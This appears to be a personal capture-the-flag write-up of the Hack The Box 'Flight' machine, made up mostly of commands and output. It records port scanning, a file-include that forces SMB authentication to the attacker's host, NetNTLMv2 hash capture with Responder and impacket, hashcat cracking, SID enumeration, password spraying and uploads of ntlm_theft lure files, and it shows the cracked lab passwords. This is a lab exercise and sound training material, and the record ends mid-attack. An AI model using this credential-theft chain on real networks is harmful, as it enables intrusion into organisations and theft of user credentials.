### [[nmap]] open ports
- 53 [[DNS]]
- 80 [[HTTP]]
- 88 [[kerberos]]
- 135 rpc
- 139,445 [[smb]]
- 
```bash
nmap -p- --min-rate=3000 10.10.11.187 -Pn -oN 10.10.11.187_nmapOpenPorts.txt                        
                                                                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 13:29 EDT                                        
Nmap scan report for 10.10.11.187                                                                      
Host is up (0.030s latency).                                                                           
Not shown: 65517 filtered tcp ports (no-response)                                                      
PORT      STATE SERVICE                                                                                
53/tcp    open  domain                                                                                 
80/tcp    open  http                                                                                   
88/tcp    open  kerberos-sec                                                                           
135/tcp   open  msrpc                                                                                  
139/tcp   open  netbios-ssn                                                                            
389/tcp   open  ldap                                                                                   
445/tcp   open  microsoft-ds                                                                           
464/tcp   open  kpasswd5                                                                               
593/tcp   open  http-rpc-epmap                                                                         
636/tcp   open  ldapssl                                                                                
3268/tcp  open  globalcatLDAP                                                                          
3269/tcp  open  globalcatLDAPssl                                                                       
9389/tcp  open  adws                                                                                   
49667/tcp open  unknown                                                                                
49673/tcp open  unknown                                                                                
49674/tcp open  unknown                                                                                
49694/tcp open  unknown                                                                                
49719/tcp open  unknown                                                                                
                          
```
### nmap services
```bash
nmap -p$ports -sSCV --min-rate=2000 10.10.11.187 -Pn -oN 10.10.11.187_nmapServicesVersions.txt      
                                                                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 13:39 EDT                                        
Nmap scan report for 10.10.11.187                                                                      
Host is up (0.031s latency).                                                                           
                                                                                                       
PORT      STATE SERVICE       VERSION                                                                  
53/tcp    open  domain        Simple DNS Plus                                                          
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)                   
|_http-title: g0 Aviation                                                                              
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1                                   
| http-methods:                                                                                        
|_  Potentially risky methods: TRACE                                                                   
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-12 00:39:53Z)           
135/tcp   open  msrpc         Microsoft Windows RPC                                                    
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                            
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Defa
ult-First-Site-Name)                                                                                   
445/tcp   open  microsoft-ds?                                                                          
464/tcp   open  kpasswd5?                                                                              
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                      
636/tcp   open  tcpwrapped                                                                             
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Defa
ult-First-Site-Name)                                                                                   
3269/tcp  open  tcpwrapped                                                                             
9389/tcp  open  mc-nmf        .NET Message Framing                                                     
49667/tcp open  msrpc         Microsoft Windows RPC                                                    
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                      
49674/tcp open  msrpc         Microsoft Windows RPC                                                    
49694/tcp open  msrpc         Microsoft Windows RPC                                                    
49719/tcp open  msrpc         Microsoft Windows RPC                                                    
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows                                     
                                                                                                       
Host script results:                                                                                   
| smb2-time:                                       
|   date: 2025-10-12T00:40:42                      
|_  start_date: N/A                                                                                    
|_clock-skew: 6h59m59s                                                                                 
| smb2-security-mode:                                                                                  
|   3:1:1:                                                                                             
|_    Message signing enabled and required                                                             
                                                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .         
Nmap done: 1 IP address (1 host up) scanned in 95.48 seconds 
```





- directory brute forcing reveals nothing
```bash

```





- subdomain brute forcing reveals school.flight.com
```bash

```




- `.php?view=` indicates that we can send commands to the website
```bash
http://school.flight.htb/index.php?view=about.html
```

- testing poc with impacket
```bash
╭─ ~/flight────────────────────────────────────────────────────────────────────────────────────────────────░▒▓ 
╰─ impacket-smbserver -smb2support -ip 10.10.14.9 shareName .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

- navigate to `school.flight.[[htb]]/index.php?view=//10.10.14.9/shareName`
	- attack box ip address/shareName

```bash
[*] Incoming connection (10.10.11.187,50875)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:f129054745347f8251cda88a1f922b6c:010100000000000080dd86d5b63ddc015616a13f1f3ee2a80000000001001000590051007200660074005a005800680003001000590051007200660074005a00580068000200100042004e00730048004f005a006d004b000400100042004e00730048004f005a006d004b000700080080dd86d5b63ddc01060004000200000008003000300000000000000000000000003000004a29ad88da121f19c1221d99880a925da853a58a0981f51b8864e5b0f16afa150a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000
[*] Closing down connection (10.10.11.187,50875)
[*] Remaining connections []
```

- using nth to identify the hash
	- netntlmv2
	- -m 5600 hashcat type
```bash
╭─ ~/flight ▓▒░────────────────────────────────────────────────────────────────────────────────────░▒▓ INT ✘  06:29:24 AM 
╰─ nth -f yourMomHash.txt 

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

svc_apache::flight:aaaaaaaaaaaaaaaa:f129054745347f8251cda88a1f922b6c:010100000000000080dd86d5b63ddc015616a13f1f3ee2a80000000001001000590051007200660074005a005800680003001000590051007200660074005a00580068000200100042004e00730048004f005a006d004b000400100042004e00730048004f005a006d004b000700080080dd86d5b63ddc01060004000200000008003000300000000000000000000000003000004a29ad88da121f19c1221d99880a925da853a58a0981f51b8864e5b0f16afa150a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

```

- cracking with hashcat
	- usename `flight`
	- password `S@Ss!K@*t13`
```bash
─ ~/flight ────────────────────────────────────────────────────────────────────────░▒▓ 127 ✘  06:24:10 AM  
╰─ hashcat -m 5600 yourMomHash.txt /usr/share/wordlists/rockyou.txt                                                         
hashcat (v7.1.2) starting                                                                                                   
...clip...
SVC_APACHE::flight:aaaaaaaaaaaaaaaa:f129054745347f8251cda88a1f922b6c:010100000000000080dd86d5b63ddc015616a13f1f3ee2a80000000001001000590051007200660074005a005800680003001000590051007200660074005a00580068000200100042004e00730048004f005a006d004b000400100042004e00730048004f005a006d004b000700080080dd86d5b63ddc01060004000200000008003000300000000000000000000000003000004a29ad88da121f19c1221d99880a925da853a58a0981f51b8864e5b0f16afa150a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000:S@Ss!K@*t13  
```

- Listing domain users
```bash
╭─ ~/flight ▓▒░─────────────────────────────────────────────────────────────────────────░▒▓ ✔ Sat18 [5/1932]
╰─ impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@10.10.11.187
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Brute forcing SIDs at 10.10.11.187
[*] StringBinding ncacn_np:10.10.11.187[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: flight\Administrator (SidTypeUser)
501: flight\Guest (SidTypeUser)
502: flight\krbtgt (SidTypeUser)
512: flight\Domain Admins (SidTypeGroup)
513: flight\Domain Users (SidTypeGroup)
514: flight\Domain Guests (SidTypeGroup)
515: flight\Domain Computers (SidTypeGroup)
516: flight\Domain Controllers (SidTypeGroup)
517: flight\Cert Publishers (SidTypeAlias)
518: flight\Schema Admins (SidTypeGroup)
519: flight\Enterprise Admins (SidTypeGroup)
520: flight\Group Policy Creator Owners (SidTypeGroup)
521: flight\Read-only Domain Controllers (SidTypeGroup)
522: flight\Cloneable Domain Controllers (SidTypeGroup)
525: flight\Protected Users (SidTypeGroup)   
526: flight\Key Admins (SidTypeGroup)                                          
527: flight\Enterprise Key Admins (SidTypeGroup)
553: flight\RAS and IAS Servers (SidTypeAlias)
571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
572: flight\Denied RODC Password Replication Group (SidTypeAlias)
1000: flight\Access-Denied Assistance Users (SidTypeAlias)
1001: flight\G0$ (SidTypeUser)                                                 
1102: flight\DnsAdmins (SidTypeAlias)
1103: flight\DnsUpdateProxy (SidTypeGroup)      
1602: flight\S.Moon (SidTypeUser)                                              
1603: flight\R.Cold (SidTypeUser)                                              
1604: flight\G.Lors (SidTypeUser)                                              
1605: flight\L.Kein (SidTypeUser)                                              
1606: flight\M.Gold (SidTypeUser)
1607: flight\C.Bum (SidTypeUser)     
1608: flight\W.Walker (SidTypeUser)                                            
1609: flight\I.Francis (SidTypeUser)
1610: flight\D.Truff (SidTypeUser)
1611: flight\V.Stevens (SidTypeUser)
1612: flight\svc_apache (SidTypeUser)
1613: flight\O.Possum (SidTypeUser)
1614: flight\WebDevs (SidTypeGroup)
```
- and after cutting up we left with a list of users
```bash
╭─ ~/flight ▓▒░─────────────────────────────────────────────────────────░▒▓ ✔  4s  05:54:46 AM  
╰─ impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@10.10.11.187 | grep SidTypeUser | cut -d ' ' -f 2 | cut -d '\' -f 2 | tee users.txt
Administrator
Guest
krbtgt
G0$
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum   
```
- Using nxc smb to use the password `S@Ss!K@*t13` to check for password reuse
	- appears s.moon uses the password also
```bash
╭─ ~/flight ▓▒░───────────────────────────────────────────────────────────────░▒▓ ✔  05:58:23 AM  
╰─ nxc smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-succes
SMB         10.10.11.187    445    G0              smbclient [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (
domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FA
ILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\G0$:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE  
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE   
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

- Using `ntlm_theft.py` to create all the files to attempt a NetNTLMv2 capture.
```bash
╭─ ~/htb/flight/ntlm_theft  master !1 ▓▒░───────────────────────────────░▒▓ ✔  01:43:48 PM   
╰─ python3 ntlm_theft.py --generate modern --server "10.10.14.9" --filename "yourMomsFace" -g all            
/home/b7h30/htb/flight/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'             
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';                                       
Created: yourMomsFace/yourMomsFace.scf (BROWSE TO FOLDER)                                                    
Created: yourMomsFace/yourMomsFace-(url).url (BROWSE TO FOLDER)                                              
Created: yourMomsFace/yourMomsFace-(icon).url (BROWSE TO FOLDER)                                             
Created: yourMomsFace/yourMomsFace.lnk (BROWSE TO FOLDER)                                                    
Created: yourMomsFace/yourMomsFace.rtf (OPEN)                                                                
Created: yourMomsFace/yourMomsFace-(stylesheet).xml (OPEN)                                                   
Created: yourMomsFace/yourMomsFace-(fulldocx).xml (OPEN)                                                     
Created: yourMomsFace/yourMomsFace.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)                           
Created: yourMomsFace/yourMomsFace-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)                 
Created: yourMomsFace/yourMomsFace-(includepicture).docx (OPEN)                                              
Created: yourMomsFace/yourMomsFace-(remotetemplate).docx (OPEN)                                              
Created: yourMomsFace/yourMomsFace-(frameset).docx (OPEN)                                                    
Created: yourMomsFace/yourMomsFace-(externalcell).xlsx (OPEN)                                                
Created: yourMomsFace/yourMomsFace.wax (OPEN)                                                                
Created: yourMomsFace/yourMomsFace.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)                                   
Created: yourMomsFace/yourMomsFace.asx (OPEN)                                                                
Created: yourMomsFace/yourMomsFace.jnlp (OPEN)                                                               
Created: yourMomsFace/yourMomsFace.application (DOWNLOAD AND OPEN)                                           
Created: yourMomsFace/yourMomsFace.pdf (OPEN AND ALLOW)                                                      
Created: yourMomsFace/zoom-attack-instructions.txt (PASTE TO CHAT)                                           
Created: yourMomsFace/yourMomsFace.library-ms (BROWSE TO FOLDER)                                             
Created: yourMomsFace/Autorun.inf (BROWSE TO FOLDER)                                                         
Created: yourMomsFace/desktop.ini (BROWSE TO FOLDER)                                                         
Created: yourMomsFace/yourMomsFace.theme (THEME TO INSTALL                                                   
Generation Complete.                

```
- Connecting to the smb share with S.Moon's creds to attempt to upload files we created
```bash
╭─ ~/htb/flight/ntlm_theft/yourMomsFace  master !1 ?1 ▓▒░───────────────────────────░▒▓ 1 ✘  02:04:49 PM   
╰─ smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'                                                     
Try "help" to get a list of possible commands.                                                               
smb: \> ls                                                                                                   
  .                                   D        0  Sat Nov  8 20:10:17 2025                                   
  ..                                  D        0  Sat Nov  8 20:10:17 2025                                   
                                                                                                             
                5056511 blocks of size 4096. 1248054 blocks available                                        
smb: \> use Shared                                                                                           
use: command not found                                                                                       
smb: \> prompt false                                                                                         
smb: \> mput *                                                                                               
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(remotetemplate).docx                              
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.asx                                                
putting file yourMomsFace-(fulldocx).xml as \yourMomsFace-(fulldocx).xml (445.8 kB/s) (average 445.8 kB/s)   
putting file desktop.ini as \desktop.ini (0.5 kB/s) (average 279.2 kB/s)                                     
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(includepicture).docx                              
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.m3u                                                
putting file yourMomsFace.theme as \yourMomsFace.theme (16.8 kB/s) (average 207.8 kB/s)                      
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.rtf                                                
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.wax                                                
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(url).url                                          
putting file yourMomsFace.jnlp as \yourMomsFace.jnlp (2.0 kB/s) (average 163.8 kB/s)                         
putting file yourMomsFace-(stylesheet).xml as \yourMomsFace-(stylesheet).xml (1.6 kB/s) (average 134.9 kB/s) 
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.scf                                                
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.htm                                                
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(externalcell).xlsx                                
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(handler).htm                                      
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(frameset).docx                                    
putting file yourMomsFace.library-ms as \yourMomsFace.library-ms (12.1 kB/s) (average 116.1 kB/s)            
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf                                                     
putting file yourMomsFace.application as \yourMomsFace.application (17.1 kB/s) (average 103.4 kB/s)          
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.lnk                                                
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.pdf                                                
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(icon).url                                         
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt  
smb: \> ls
  .                                   D        0  Sat Nov  8 21:05:40 2025
  ..                                  D        0  Sat Nov  8 21:05:40 2025
  desktop.ini                         A       46  Sat Nov  8 21:05:39 2025
  yourMomsFace-(fulldocx).xml         A    72584  Sat Nov  8 21:05:39 2025
  yourMomsFace-(stylesheet).xml       A      162  Sat Nov  8 21:05:39 2025
  yourMomsFace.application            A     1649  Sat Nov  8 21:05:40 2025
  yourMomsFace.jnlp                   A      191  Sat Nov  8 21:05:39 2025
  yourMomsFace.library-ms             A     1218  Sat Nov  8 21:05:40 2025
  yourMomsFace.theme                  A     1638  Sat Nov  8 21:05:39 2025

                5056511 blocks of size 4096. 1248032 blocks available

```

- Using smbclient to login to smb Shared Share with S.Moon Creds and upload ntlm_theft generated ntlm files. 
- Running responder and impacket smb-server to grab hashes if ntlm_theft files work.
	- Responder or impacket smb-server - Don't need both
- Responder
`sudo [[responder]] -I tun0`
- impacket smb-server
`impacket-smbserver -smb2support yourMomsShare .`
- uploading ntlm_theft generated files
```bash
╭─ ~/htb/flight/ntlm_theft/yourMomsFace  master !1 ?1 ▓▒░────────────────────░▒▓ ✔  17m 45s  11:02:30 AM  
╰─ smbclient --user='flight.htb/S.Moon%S@Ss!K@*t13' //10.10.11.187/Shared                                    
Try "help" to get a list of possible commands.                                                               
smb: \> ls                                                                                                   
  .                                   D        0  Sun Nov  9 17:48:17 2025                                   
  ..                                  D        0  Sun Nov  9 17:48:17 2025                                   
                                                                                                             
                5056511 blocks of size 4096. 1205097 blocks available  
smb: \> mput *
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(remotetemplate).docx
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.asx
putting file yourMomsFace-(fulldocx).xml as \yourMomsFace-(fulldocx).xml (448.6 kB/s) (average 161.8 kB/s)
putting file desktop.ini as \desktop.ini (0.5 kB/s) (average 133.6 kB/s)
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.m3u
putting file yourMomsFace.theme as \yourMomsFace.theme (17.4 kB/s) (average 116.4 kB/s)
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.rtf
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.wax
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(url).url
putting file yourMomsFace.jnlp as \yourMomsFace.jnlp (2.0 kB/s) (average 101.9 kB/s)
putting file yourMomsFace-(stylesheet).xml as \yourMomsFace-(stylesheet).xml (1.7 kB/s) (average 90.1 kB/s)
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.scf
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.htm
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(externalcell).xlsx
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(handler).htm
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(frameset).docx
putting file yourMomsFace.library-ms as \yourMomsFace.library-ms (12.4 kB/s) (average 81.9 kB/s)
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
putting file yourMomsFace.application as \yourMomsFace.application (17.5 kB/s) (average 76.0 kB/s)
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.lnk
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace.pdf
NT_STATUS_ACCESS_DENIED opening remote file \yourMomsFace-(icon).url
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt

```
- Responder capturing ntlm hashes
```bash
╰─ sudo responder -I tun0 -v                                                                                                                  
[sudo] password for b7h30:                                                                                                                    
                                         __                                                                                                   
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                      
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                      
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                        
                   |__|                                                                                                                       
                                                                                                                                              
                                                                                                                                              
[+] Poisoners:                                                                                                                                
    LLMNR                      [ON]                                                                                                           
    NBT-NS                     [ON]                                                                                                           
    MDNS                       [ON]                                                                                                           
    DNS                        [ON]                                                                                                           
    DHCP                       [OFF]                                                                                                          
                                                                                                                                              
[+] Servers:                                                                                                                                  
    HTTP server                [ON]                                                                                                           
    HTTPS server               [ON]                                                                                                           
    WPAD proxy                 [OFF]                                                                                                          
    Auth proxy                 [OFF]                                                                                                          
    SMB server                 [ON]                                                                                                           
    Kerberos server            [ON]                                                                                                           
    SQL server                 [ON]                                                                                                           
    FTP server                 [ON]                                                                                                           
    IMAP server                [ON]                                                                                                           
    POP3 server                [ON]                                                                                                           
    SMTP server                [ON]                                                                                                           
    DNS server                 [ON]                                                                                                           
    LDAP server                [ON]                                                                                                           
    MQTT server                [ON]                                                                                                           
    RDP server                 [ON]                                                                                                           
    DCE-RPC server             [ON]                                                                                                           
    WinRM server               [ON]                                                                                                           
    SNMP server                [ON]                                                                                                           
                                                                                                                                              
[+] HTTP Options:                                                                                            
    Always serving EXE         [OFF]                                                                         
    Serving EXE                [OFF]                                                                         
    Serving HTML               [OFF]                                                                         
    Upstream Proxy             [OFF]  

[+] Poisoning Options:                                                                                       
    Analyze Mode               [OFF]                                   
    Force WPAD auth            [OFF]                                   
    Force Basic Auth           [OFF]                                   
    Force LM downgrade         [OFF]                                   
    Force ESS downgrade        [OFF]                                   

[+] Generic Options:               
    Responder NIC              [tun0]                                  
    Responder IP               [10.10.14.9]                            
    Responder IPv6             [dead:beef:2::1007]                     
    Challenge set              [random]                                
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']                                                                                     
    Don't Respond To MDNS TLD  ['_DOSVC']                              
    TTL for poisoned response  [default]                               

[+] Current Session Variables:                                         
    Responder Machine Name     [WIN-TXWHC2DMXIS]                       
    Responder Domain Name      [EBJE.LOCAL]                            
    Responder DCE-RPC Port     [46250]                                 

[*] Version: Responder 3.1.7.0                                         
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>                    
[*] To sponsor Responder: https://paypal.me/PythonResponder                                                                                   

[+] Listening for events...        

[!] Error starting TCP server on port 3389, check permissions or other servers running.                                                       
[SMB] NTLMv2-SSP Client   : 10.10.11.187                               
[SMB] NTLMv2-SSP Username : flight.htb\c.bum                           
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:1f93bc4a9c4651ed:73D6BF8F0E3092AA7C8D14945CF789C8:010100000000000000A7563C6951DC01D94F16E4C7AB99
E10000000002000800450042004A00450001001E00570049004E002D0054005800570048004300320044004D0058004900530004003400570049004E002D005400580057004800
4300320044004D005800490053002E00450042004A0045002E004C004F00430041004C0003001400450042004A0045002E004C004F00430041004C0005001400450042004A0045
002E004C004F00430041004C000700080000A7563C6951DC010600040002000000080030003000000000000000000000000030000033942AF8026860E2D3C3D07D4DFB3A1A89B1
520CE2478FF26D46EF3B6AE6D6B00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003900000000
0000000000                         
[+] Exiting...           
```
- impacket smb-server capturing hashes
```bash
╭─ ~ ▓▒░──────────────────────────────────────────────────────────────────────────────░▒▓ 2 ✘  11:12:54 AM                 11:15:37 [24/1720]
╰─ impacket-smbserver -smb2support yourMomsShare .                                                                                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                    

[*] Config file parsed             
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                                                        
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                                                        
[*] Config file parsed             
[*] Config file parsed             
[*] Incoming connection (10.10.11.187,53991)                           
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)                         
[*] User G0\c.bum authenticated successfully                           
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:f053c7a02be9d9adf90a4563f6d12d8a:010100000000000080549ef19351dc01a3f5ff17f0b0f35500000000010010007a0067
0050004d0072007a0071006a00030010007a00670050004d0072007a0071006a000200100044007a006f00580041006700440072000400100044007a006f005800410067004400
72000700080080549ef19351dc010600040002000000080030003000000000000000000000000030000033942af8026860e2d3c3d07d4dfb3a1a89b1520ce2478ff26d46ef3b6a
e6d6b00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000
[*] Closing down connection (10.10.11.187,53991)                       
[*] Remaining connections []                                           
[*] Incoming connection (10.10.11.187,53992)                           
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)                         
[*] User G0\c.bum authenticated successfully                           
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:20eb2976df0b946d11139a3b412288ac:010100000000000080549ef19351dc01052ca5d2ff54824200000000010010007a0067
0050004d0072007a0071006a00030010007a00670050004d0072007a0071006a000200100044007a006f00580041006700440072000400100044007a006f005800410067004400
72000700080080549ef19351dc010600040002000000080030003000000000000000000000000030000033942af8026860e2d3c3d07d4dfb3a1a89b1520ce2478ff26d46ef3b6a
e6d6b00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000
[*] Closing down connection (10.10.11.187,53992)                       
[*] Remaining connections []                                           
[*] Incoming connection (10.10.11.187,53994)                           
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)                         
[*] User G0\c.bum authenticated successfully                           
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:be7a5f67096d66bf3eabaacd57a2b114:0101000000000000809a61159451dc014bbfb779b8316c8700000000010010007a0067
0050004d0072007a0071006a00030010007a00670050004d0072007a0071006a000200100044007a006f00580041006700440072000400100044007a006f005800410067004400
720007000800809a61159451dc010600040002000000080030003000000000000000000000000030000033942af8026860e2d3c3d07d4dfb3a1a89b1520ce2478ff26d46ef3b6a
e6d6b00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000
[*] Closing down connection (10.10.11.187,53994)                       

```
- cracking ntlm hash with hashcat
	- u/n `C.Bum`
	- p/w `Tikkycoll_431012284`
```bash
╭─ ~/htb/flight ▓▒░──────────────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  12:33:33 PM 
╰─ hashcat -m 5600 yourMomsOtherHash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 6972/13945 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 513 MB (8440 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

C.BUM::flight.htb:aaaaaaaaaaaaaaaa:be7a5f67096d66bf3eabaacd57a2b114:0101000000000000809a61159451dc014bbfb779b8316c8700000000010010007a00670050004d0072007a0071006a00030010007a00670050004d0072007a0071006a000200100044007a006f00580041006700440072000400100044007a006f005800410067004400720007000800809a61159451dc010600040002000000080030003000000000000000000000000030000033942af8026860e2d3c3d07d4dfb3a1a89b1520ce2478ff26d46ef3b6ae6d6b00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0039000000000000000000:Tikkycoll_431012284
                                                          
Session..........: hashcat
Status...........: Cracked
